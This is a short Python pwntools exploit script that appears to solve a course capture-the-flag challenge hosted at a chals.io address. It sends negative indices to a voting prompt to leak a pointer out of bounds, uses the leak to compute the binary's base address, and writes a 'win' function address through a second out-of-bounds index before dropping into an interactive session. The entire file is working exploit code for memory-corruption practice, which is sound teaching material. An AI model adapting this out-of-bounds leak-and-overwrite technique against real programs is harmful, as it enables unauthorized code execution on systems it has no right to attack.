#! /usr/bin/python

from pwn import *

context.update(
        arch="amd64",
        #arch="i386",
        endian="little",
        log_level="debug",
        os="linux",
        #terminal=["tmux", "split-window", "-h", "-p 65"]
        terminal=["st"]
)

def start(binary):

    gs = '''
        init-pwndbg
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
    '''


    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote("cse4850-oob-1.chals.io", 443, ssl=True, sni="cse4850-oob-1.chals.io")
    else:
        return process(binary)

def exploit(p,e,r):

    p.recvuntil(b"vote for [0-3] >>>")
    p.sendline(b"-3")

    p.recvuntil(b"#-3:")
    leak = int(p.recvline(),16)
    base = leak - 0x3548
    win = p64(base + 0x1203)
    p.sendline(b"AAAAAAAA")
    p.recvuntil(b"vote for [0-3] >>>")
    p.sendline(b"-6")
    p.recvuntil(b"title for #-6 >>>")
    p.sendline(win)
    p.interactive()

    return None

if __name__=="__main__":
    file = './chal.bin'

    p = start(file)
    e = context.binary = ELF(file)
    r = ROP(e)

    exploit(p,e,r)
